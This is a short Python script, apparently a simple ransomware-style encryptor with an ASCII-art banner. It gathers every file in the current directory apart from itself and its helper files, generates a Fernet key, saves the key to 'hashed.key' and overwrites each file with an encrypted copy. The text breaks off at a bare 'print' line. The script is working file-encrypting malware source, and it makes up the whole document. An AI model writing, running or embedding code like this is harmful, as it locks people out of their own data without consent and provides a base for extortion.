#!/usr/bin/env python3

import os
import time
from cryptography.fernet import Fernet

#colors
green = "\033[32;1m"
red = "\033[31;1m"

#banner
banner = '''      
                                                 
 _|_|_|     _|_|_|     _|      _|     _|       _|_|    
 _|    _|         _|     _|  _|     _|  _|   _|    _|  
 _|_|_|       _|_|         _|       _|  _|     _|_|    
 _|    _|         _|     _|  _|     _|  _|   _|    _|  
 _|    _|   _|_|_|     _|      _|     _|       _|_|    
		                                       '''

print(banner)

print("[!]Searching for files\n")
time.sleep(1)

#output all dir files
files = []

for file in os.listdir():
	if file == "encryptor.py" or file == "hashed.key" or file == "decryptor.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)
time.sleep(2)
print(green,"\n[!]Encrypted") 

#encrypting files with Fernet

key = Fernet.generate_key()

with open ("hashed.key", "wb") as hashed:
	hashed.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print
